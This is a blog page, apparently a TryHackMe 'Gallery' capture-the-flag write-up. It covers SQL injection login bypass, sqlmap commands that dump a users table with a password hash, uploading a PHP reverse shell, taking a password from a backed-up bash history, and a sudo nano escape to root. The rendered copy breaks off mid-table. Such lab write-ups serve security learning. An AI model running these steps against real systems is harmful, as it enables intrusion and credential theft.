@@ -1,0 +1,400 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>Try Hack Me - Gallery | Hakune Blog</title>
+<meta name=keywords content="ctf,thm,tech">
+<meta name=description content="A great beginner machine to learn SQL injection">
+<meta name=author content="Aki Hakune">
+<link rel=canonical href=https://git-akihakune.github.io>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.189a63b85d2e4ae9611de9bef28f822f81e0e419a940f31638378cf24b05fb68.css integrity="sha256-GJpjuF0uSulhHem+8o+CL4Hg5BmpQPMWODeM8ksF+2g=" rel="preload stylesheet" as=style>
+<link rel=preload href=/static/banner.png as=image>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://git-akihakune.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico>
+<link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico>
+<link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.92.1">
+<link rel=alternate hreflang=en href=https://git-akihakune.github.io/blog/gallery/>
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+</noscript><link rel=manifest href=/hakune.webmanifest>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-F8M24PKNWZ',{anonymize_ip:!1})}</script>
+<meta property="og:title" content="Try Hack Me - Gallery">
+<meta property="og:description" content="A great beginner machine to learn SQL injection">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://git-akihakune.github.io/blog/gallery/">
+<meta property="og:image" content="https://git-akihakune.github.io/img/gallery/gallery.jpg"><meta property="article:section" content="blog">
+<meta property="article:published_time" content="2022-02-24T16:34:48+07:00">
+<meta property="article:modified_time" content="2022-02-24T16:34:48+07:00"><meta property="og:site_name" content="Hakune Blog">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://git-akihakune.github.io/img/gallery/gallery.jpg">
+<meta name=twitter:title content="Try Hack Me - Gallery">
+<meta name=twitter:description content="A great beginner machine to learn SQL injection">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Try Hack Me - Gallery","item":"https://git-akihakune.github.io/blog/gallery/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Try Hack Me - Gallery","name":"Try Hack Me - Gallery","description":"A great beginner machine to learn SQL injection","keywords":["ctf","thm","tech"],"articleBody":"Overview Welcome to Try Hack Me’s Gallery! In short, this box is all about SQL injection - inject all the way to get a shell, then exploit a command that we can run as root to get the flag!\nI. Reconnaisance tl;dr: Scan for open ports, find out a login form. Perform a SQL injection to log in. Here’s the port scan result:\n# Nmap 7.92 scan initiated Thu Feb 17 04:55:27 2022 as: nmap -sC -sV -oN nmap.txt 10.10.177.242 Nmap scan report for 10.10.177.242 Host is up (0.40s latency). Not shown: 3998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Simple Image Gallery System | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 17 05:13:08 2022 -- 1 IP address (1 host up) scanned in 1061.16 seconds This should answer the first question - how many ports are opening.\nGoing into details, here’s what’s on port 80.\n Just a standard Apache page. There was absolutely nothing abnormal in the source code. Normally we would look for subdirectories or subdomains in times like this, but for now, let’s see to port 8080 first:\n A simple login form. Testing it against some widely used default credentials, the app did not let us in. Its source code, on the other hand, did have something: However, /forgot-password.html end point, in fact, returned a standard 404 error:\n$ curl http://10.10.69.246/gallery/forgot-password.html  htmlhead title404 Not Foundtitle headbody h1Not Foundh1 pThe requested URL was not found on this server.p hr addressApache/2.4.29 (Ubuntu) Server at 10.10.69.246 Port 80address bodyhtml Take another look at browser’s DevTool, it showed something genuinely noteworthy.\n Embedded in the HTTP response is a SQL query, as if it’s tempting us to do a SQL injection. From the most basic one first:\n …Well?\n Why didn’t it work? Before we continue, can you figure out why?\nA bit agonizing, self-doubting and Googling, I realized that it should have been =, not ==. The result of a month working in NoSQL fully unveiled before my eyes.\nAfter that slight amendation, the app let us in as Administrator.\n II. CME attack - database tl;dr: Use a public exploit of the CME to get data within the MySQL database. I looked around in the web app, and even as Administrator, it didn’t exposed anything remarkable. If the vulnerability was not in the content or configuration, it must be in the app itself. Therefore, to no one surprise, several public exploits can be found in no time using searchsploit:\n$ searchsploit \"Simple Image Gallery\" ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- Joomla Plugin Simple Image Gallery Extended ( | php/webapps/49064.txt Joomla! Component Kubik-Rubik Simple Image Ga | php/webapps/44104.txt Simple Image Gallery 1.0 - Remote Code Execut | php/webapps/50214.py Simple Image Gallery System 1.0 - 'id' SQL In | php/webapps/50198.txt ---------------------------------------------- --------------------------------- Shellcodes: No Results How convenient it is to have a RCE PoC right on line 3. However, for some god-know reason, the Python script didn’t work for me. As a consequence, we had to manually SQL inject it. Here are the instructed steps:\nStep 1. Login to the application with any verified user credentials Step 2. Click on Albums page and select an albums if created or create by clicking on \"Add New\" on the top right and select the album. Step 3. Click on an image and capture the request in burpsuite. Now copy the request and save it as test.req . Step 4. Run the sqlmap command \"sqlmap -r test.req --dbs Step 5. This will inject successfully and you will have an information disclosure of all databases contents. At least, that was the initial plan. Everything went smoothly until step 4, when I ran this command:\nsqlmap -r test.req --dbs Unexpectedly, I received this:\n[WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. For that reason, I had to change the commands a bit. Here is a sequence of sqlmap commands that I ran:\n# discover databases $ sqlmap -r test.req --dbs --flush-session --technique=BEUS available databases [2]: [*] gallery_db [*] information_schema # discover tables sqlmap -r test.req --tables -D gallery_db tabase: gallery_db [4 tables] +-------------+ | album_list | | images | | system_info | | users | +-------------+ # get columns of a table sqlmap -r test.req --columns -D gallery_db -T users --threads 4 Database: gallery_db Table: users [10 columns] +--------------+--------------+ | Column | Type | +--------------+--------------+ | avatar | text | | date_added | datetime | | date_updated | datetime | | firstname | varchar(250) | | id | int(50) | | last_login | datetime | | lastname | varchar(250) | | password | text | | type | tinyint(1) | | username | text | +--------------+--------------+ # extract data from table sqlmap -r test.req --dump -D gallery_db -T users --threads 4 Database: gallery_db Table: users [1 entry] +----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+ | id | type | avatar | lastname | password | username | firstname | date_added | last_login | date_updated | +----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+ | 1 | 1 | uploads/1629883080_1624240500_avatar.png | Admin | 0f18fd4cf40bfb1dec646807c7fa5522 (lmao) | admin | Adminstrator | 2021-01-20 14:02:37 | NULL | 2022-02-23 08:55:43 | +----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+ That password… isn’t that the very password that I set earlier? It it the answer to a THM question? Was I not supposed to change it?\nAs a result, I had to restart the machine and run the exact command once again.\nDatabase: gallery_db Table: users [1 entry] +----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+ | id | type | avatar | lastname | password | username | firstname | date_added | last_login | date_updated | +----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+ | 1 | 1 | uploads/1629883080_1624240500_avatar.png | Admin | a228b12a08b6527e7978cbe5d914531c | admin | Adminstrator | 2021-01-20 14:02:37 | NULL | 2021-08-25 09:18:12 | +----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+ III. CME attack - reverse shell tl;dr: Upload PHP reverse shell, got reverse shell This one was disappointingly facile. There was an option to upload the image in the web app, so I tried to upload a standard PHP reverse shell from Pentest Monkey. Then open the image.\nStrangely, my long-waited netcat listener received a call back.\n$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) IV. Privilege escalation - user tl;dr: Escalate to user privilege using credentials in .bash_history Yes, as you have just read. This fictional user foolishly typed his password into a bash command. You just need to look for it in a back up.\n$ find / -name \"*backup*\" 2/dev/null # One of the top commands you should run when you get a shell usr/src/linux-headers-4.15.0-167-generic/include/config/wm831x/backup.h /usr/src/linux-headers-4.15.0-154-generic/include/config/wm831x/backup.h /etc/lvm/backup /var/backups Apparently, we see to /var/backups.\n$ ls /var/backups apt.extended_states.0 apt.extended_states.1.gz apt.extended_states.2.gz apt.extended_states.3.gz mike_home_backup What’s there in mike_home_backup directory?\n$ ls /var/backups/mike_home_backup accounts.txt Interestingly, this accounts.txt file is just a trap.\n$ cat accounts.txt Spotify : mike@gmail.com:mycat666 Netflix : mike@gmail.com:123456789pass TryHackme: mike:darkhacker123 Ther real credentials lies at /var/backups/mike_home_backup/.bash_history, right here:\n$ cat /var/backups/mike_home_backup/.bash_history cat .bash_history cd ~ ls ping 1.1.1.1 cat /home/mike/user.txt cd /var/www/ ls cd html ls -al cat index.html sudo -lb3stpassw0rdbr0xx clear sudo -l exit See? His password was b3stpassw0rdbr0xx. Now run su mike, enter the password, and see what’s left.\nmike@gallery:/var/backups/mike_home_backup$ id id uid=1001(mike) gid=1001(mike) groups=1001(mike) V. Privilege Escalation - root tl;dr: Exploit a script that user can run as root A second in and I immediately know where to look to:\nmike@gallery:/var/backups/mike_home_backup$ sudo -l sudo -l Matching Defaults entries for mike on gallery: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mike may run the following commands on gallery: (root) NOPASSWD: /bin/bash /opt/rootkit.sh So we can run /opt/rootkit.sh as root. By the way, we can also read it:\n#!/bin/bash  read -e -p \"Would you like to versioncheck, update, list or read the report ? \" ans; # Execute your choice case $ans in versioncheck) /usr/bin/rkhunter --versioncheck ;; update) /usr/bin/rkhunter --update;; list) /usr/bin/rkhunter --list;; read) /bin/nano /root/report.txt;; *) exit;; esac Seems like a script to check for rootkit. Ironically, the script to check for rootkit is a rootkit itself.\nTake a look at that read option, do you see that we can run nano as root? According to GTFOBins, that much is enough to break out and get a shell.\n Type exactly that, character-by-character, we broke out of nano and got the root shell.\n# id uid=0(root) gid=0(root) groups=0(root) # cd /root # ls report.txt root.txt And that’s all. A pretty basic challenge. Hope you’ve enjoyed it!\n","wordCount":"1424","inLanguage":"en","image":"https://git-akihakune.github.io/img/gallery/gallery.jpg","datePublished":"2022-02-24T16:34:48+07:00","dateModified":"2022-02-24T16:34:48+07:00","author":[{"@type":"Person","name":"Aki Hakune"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/gallery/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script>
+</head>
+<body class=dark id=top>
+<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)">
+<img src=/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+<ul class=lang-switch><li>|</li>
+<li>
+<a href=https://git-akihakune.github.io/vi/ title=Vi aria-label=Vi>Vi</a>
+</li>
+</ul>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://git-akihakune.github.io/archive/ title=archive>
+<span>archive</span>
+</a>
+</li>
+<li>
+<a href=https://git-akihakune.github.io/blog/ title=blog>
+<span>blog</span>
+</a>
+</li>
+<li>
+<a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/>
+<span>search</span>
+</a>
+</li>
+<li>
+<a href=https://git-akihakune.github.io/tags/ title=tags>
+<span>tags</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div>
+<h1 class=post-title>
+Try Hack Me - Gallery
+</h1>
+<div class=post-meta><span title="2022-02-24 16:34:48 +0700 +07">February 24, 2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/ rel="noopener noreferrer" target=_blank>Suggest Changes</a>
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#overview aria-label=Overview>Overview</a></li>
+<li>
+<a href=#i-reconnaisance aria-label="I. Reconnaisance">I. Reconnaisance</a></li>
+<li>
+<a href=#ii-cme-attack---database aria-label="II. CME attack - database">II. CME attack - database</a></li>
+<li>
+<a href=#iii-cme-attack---reverse-shell aria-label="III. CME attack - reverse shell">III. CME attack - reverse shell</a></li>
+<li>
+<a href=#iv-privilege-escalation---user aria-label="IV. Privilege escalation - user">IV. Privilege escalation - user</a></li>
+<li>
+<a href=#v-privilege-escalation---root aria-label="V. Privilege Escalation - root">V. Privilege Escalation - root</a>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2>
+<p>Welcome to <a href=https://tryhackme.com/room/gallery>Try Hack Me&rsquo;s Gallery</a>! In short, this box is all about <a href=https://portswigger.net/web-security/sql-injection>SQL injection</a> - inject all the way to get a shell, then exploit a command that we can run as <strong><code>root</code></strong> to get the flag!</p>
+<h2 id=i-reconnaisance>I. Reconnaisance<a hidden class=anchor aria-hidden=true href=#i-reconnaisance>#</a></h2>
+<span style=color:#696969><strong>tl;dr:</strong> Scan for open ports, find out a login form. Perform a SQL injection to log in.</span>
+<p>Here&rsquo;s the port scan result:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># Nmap 7.92 scan initiated Thu Feb 17 04:55:27 2022 as: nmap -sC -sV -oN nmap.txt 10.10.177.242</span>
+Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10.177.242</span>
+Host <span style=color:#f92672>is</span> up (<span style=color:#ae81ff>0.40</span>s latency)<span style=color:#f92672>.</span>
+Not shown: <span style=color:#ae81ff>3998</span> closed tcp ports (conn<span style=color:#f92672>-</span>refused)
+PORT     STATE SERVICE VERSION
+<span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp   open  http    Apache httpd <span style=color:#ae81ff>2.4.29</span> ((Ubuntu))
+<span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4.29</span> (Ubuntu)
+<span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Apache2 Ubuntu Default Page: It works
+<span style=color:#ae81ff>8080</span><span style=color:#f92672>/</span>tcp open  http    Apache httpd <span style=color:#ae81ff>2.4.29</span> ((Ubuntu))
+<span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>open<span style=color:#f92672>-</span>proxy: Potentially OPEN proxy<span style=color:#f92672>.</span>
+<span style=color:#f92672>|</span>_Methods supported:CONNECTION
+<span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4.29</span> (Ubuntu)
+<span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Simple Image Gallery System
+<span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>cookie<span style=color:#f92672>-</span>flags: 
+<span style=color:#f92672>|</span>   <span style=color:#f92672>/</span>: 
+<span style=color:#f92672>|</span>     PHPSESSID: 
+<span style=color:#f92672>|</span>_      httponly flag <span style=color:#f92672>not</span> set
+
+Service detection performed<span style=color:#f92672>.</span> Please report any incorrect results at https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>submit<span style=color:#f92672>/</span> <span style=color:#f92672>.</span>
+<span style=color:#75715e># Nmap done at Thu Feb 17 05:13:08 2022 -- 1 IP address (1 host up) scanned in 1061.16 seconds</span>
+</code></pre></div><p>This should answer the first question - <code>how many ports are opening</code>.</p>
+<p>Going into details, here&rsquo;s what&rsquo;s on port 80.</p>
+<p>
+<img src=/img/gallery/apache-default-port-80.png#center alt>
+</p>
+<p>Just a standard <em><strong><code>Apache</code></strong></em> page. There was absolutely nothing abnormal in the source code. Normally we would look for subdirectories or subdomains in times like this, but for now, let&rsquo;s see to port 8080 first:</p>
+<p>
+<img src=/img/gallery/default-port-8080.png#center alt>
+</p>
+<p>A simple login form. Testing it against some widely used default credentials, the app did not let us in. Its source code, on the other hand, did have something:
+<img src=/img/gallery/something-on-login-page.png#center alt>
+</p>
+<p>However, <code>/forgot-password.html</code> end point, in fact, returned a standard 404 error:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$ curl http://10.10.69.246/gallery/forgot-password.html
+<span style=color:#75715e>&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
+&lt;<span style=color:#f92672>html</span>&gt;&lt;<span style=color:#f92672>head</span>&gt;
+&lt;<span style=color:#f92672>title</span>&gt;404 Not Found&lt;/<span style=color:#f92672>title</span>&gt;
+&lt;/<span style=color:#f92672>head</span>&gt;&lt;<span style=color:#f92672>body</span>&gt;
+&lt;<span style=color:#f92672>h1</span>&gt;Not Found&lt;/<span style=color:#f92672>h1</span>&gt;
+&lt;<span style=color:#f92672>p</span>&gt;The requested URL was not found on this server.&lt;/<span style=color:#f92672>p</span>&gt;
+&lt;<span style=color:#f92672>hr</span>&gt;
+&lt;<span style=color:#f92672>address</span>&gt;Apache/2.4.29 (Ubuntu) Server at 10.10.69.246 Port 80&lt;/<span style=color:#f92672>address</span>&gt;
+&lt;/<span style=color:#f92672>body</span>&gt;&lt;/<span style=color:#f92672>html</span>&gt;
+</code></pre></div><p>Take another look at browser&rsquo;s <strong>DevTool</strong>, it showed something genuinely noteworthy.</p>
+<p>
+<img src=/img/gallery/cms-response.png#center alt>
+</p>
+<p>Embedded in the HTTP response is a SQL query, as if it&rsquo;s tempting us to do a <a href=https://portswigger.net/web-security/sql-injection>SQL injection</a>. From the most basic one first:</p>
+<p>
+<img src=/img/gallery/not-work-sqli-1.png#center alt>
+</p>
+<p>&mldr;Well?</p>
+<p>
+<img src=/img/gallery/not-work-sqli-2.png#center alt>
+<img src=/img/gallery/not-work-sqli-3.png#center alt>
+</p>
+<p>Why didn&rsquo;t it work? Before we continue, can you figure out why?</p>
+<p>A bit agonizing, self-doubting and Googling, I realized that it should have been <strong><code>=</code></strong>, not <strong><code>==</code></strong>. The result of a month working in NoSQL fully unveiled before my eyes.</p>
+<p>After that slight amendation, the app let us in as <em><code>Administrator</code></em>.</p>
+<p>
+<img src=/img/gallery/landing-page.png#center alt>
+</p>
+<h2 id=ii-cme-attack---database>II. CME attack - database<a hidden class=anchor aria-hidden=true href=#ii-cme-attack---database>#</a></h2>
+<span style=color:#696969><strong>tl;dr:</strong> Use a public exploit of the CME to get data within the MySQL database.</span>
+<p>I looked around in the web app, and even as <em><code>Administrator</code></em>, it didn&rsquo;t exposed anything remarkable. If the vulnerability was not in the content or configuration, it must be in the app itself. Therefore, to no one surprise, several public exploits can be found in no time using <strong>searchsploit</strong>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ searchsploit <span style=color:#e6db74>&#34;Simple Image Gallery&#34;</span>
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Joomla Plugin Simple Image Gallery Extended <span style=color:#f92672>(</span> | php/webapps/49064.txt
+Joomla! Component Kubik-Rubik Simple Image Ga | php/webapps/44104.txt
+Simple Image Gallery 1.0 - Remote Code Execut | php/webapps/50214.py
+Simple Image Gallery System 1.0 - <span style=color:#e6db74>&#39;id&#39;</span> SQL In | php/webapps/50198.txt
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div><p>How convenient it is to have a <strong>RCE</strong> PoC right on line 3. However, for some god-know reason, the Python script didn&rsquo;t work for me. As a consequence, we had to manually SQL inject it. Here are the instructed steps:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown>Step 1. Login to the application with any verified user credentials
+
+Step 2. Click on Albums page and select an albums if created or create
+by clicking on &#34;Add New&#34; on the top right and select the album.
+
+Step 3. Click on an image and capture the request in burpsuite.
+Now copy the request and save it as test.req .
+
+Step 4. Run the sqlmap command &#34;sqlmap -r test.req --dbs
+
+Step 5. This will inject successfully and you will have an information
+disclosure of all databases contents.
+</code></pre></div><p>At least, that was the initial plan. Everything went <em>smoothly</em> until step 4, when I ran this command:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -r test.req --dbs
+</code></pre></div><p>Unexpectedly, I received this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#><span style=color:#a6e22e>[WARNING]</span> most likely web server instance hasn<span style=color:#960050;background-color:#1e0010>&#39;</span>t recovered yet <span style=color:#66d9ef>from</span> previous timed based payload.
+</code></pre></div><p>For that reason, I had to change the commands a bit. Here is a sequence of <em><strong>sqlmap</strong></em> commands that I ran:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># discover databases</span>
+<span style=color:#960050;background-color:#1e0010>$</span> sqlmap <span style=color:#f92672>-</span>r test<span style=color:#f92672>.</span>req <span style=color:#f92672>--</span>dbs <span style=color:#f92672>--</span>flush<span style=color:#f92672>-</span>session <span style=color:#f92672>--</span>technique<span style=color:#f92672>=</span>BEUS
+available databases [<span style=color:#ae81ff>2</span>]:
+[<span style=color:#f92672>*</span>] gallery_db
+[<span style=color:#f92672>*</span>] information_schema
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># discover tables</span>
+sqlmap <span style=color:#f92672>-</span>r test<span style=color:#f92672>.</span>req <span style=color:#f92672>--</span>tables <span style=color:#f92672>-</span>D gallery_db
+tabase: gallery_db
+[<span style=color:#ae81ff>4</span> tables]
+<span style=color:#f92672>+-------------+</span>
+<span style=color:#f92672>|</span> album_list  <span style=color:#f92672>|</span>
+<span style=color:#f92672>|</span> images      <span style=color:#f92672>|</span>
+<span style=color:#f92672>|</span> system_info <span style=color:#f92672>|</span>
+<span style=color:#f92672>|</span> users       <span style=color:#f92672>|</span>
+<span style=color:#f92672>+-------------+</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># get columns of a table</span>
+sqlmap <span style=color:#f92672>-</span>r test<span style=color:#f92672>.</span>req <span style=color:#f92672>--</span>columns <span style=color:#f92672>-</span>D gallery_db <span style=color:#f92672>-</span>T users <span style=color:#f92672>--</span>threads <span style=color:#ae81ff>4</span>
+Database: gallery_db                                                                                                                                                                                                                          
+Table: users                                                                                                                                                                                                                                  
+[<span style=color:#ae81ff>10</span> columns]                                                                                                                                                                                                                                  
+<span style=color:#f92672>+--------------+--------------+</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> Column       <span style=color:#f92672>|</span> Type         <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>+--------------+--------------+</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> avatar       <span style=color:#f92672>|</span> text         <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> date_added   <span style=color:#f92672>|</span> datetime     <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> date_updated <span style=color:#f92672>|</span> datetime     <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> firstname    <span style=color:#f92672>|</span> varchar(<span style=color:#ae81ff>250</span>) <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> id           <span style=color:#f92672>|</span> int(<span style=color:#ae81ff>50</span>)      <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> last_login   <span style=color:#f92672>|</span> datetime     <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> lastname     <span style=color:#f92672>|</span> varchar(<span style=color:#ae81ff>250</span>) <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> password     <span style=color:#f92672>|</span> text         <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> type         <span style=color:#f92672>|</span> tinyint(<span style=color:#ae81ff>1</span>)   <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>|</span> username     <span style=color:#f92672>|</span> text         <span style=color:#f92672>|</span>                                                                                                                                                                                                               
+<span style=color:#f92672>+--------------+--------------+</span>   
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># extract data from table</span>
+sqlmap <span style=color:#f92672>-</span>r test<span style=color:#f92672>.</span>req <span style=color:#f92672>--</span>dump <span style=color:#f92672>-</span>D gallery_db <span style=color:#f92672>-</span>T users <span style=color:#f92672>--</span>threads <span style=color:#ae81ff>4</span>
+Database: gallery_db                                                                                                 
+Table: users
+[<span style=color:#ae81ff>1</span> entry]
+<span style=color:#f92672>+----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+</span>
+<span style=color:#f92672>|</span> id <span style=color:#f92672>|</span> type <span style=color:#f92672>|</span> avatar                                   <span style=color:#f92672>|</span> lastname <span style=color:#f92672>|</span> password                                <span style=color:#f92672>|</span> username <span style=color:#f92672>|</span> firstname    <span style=color:#f92672>|</span> date_added          <span style=color:#f92672>|</span> last_login <span style=color:#f92672>|</span> date_updated        <span style=color:#f92672>|</span>
+<span style=color:#f92672>+----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+</span>
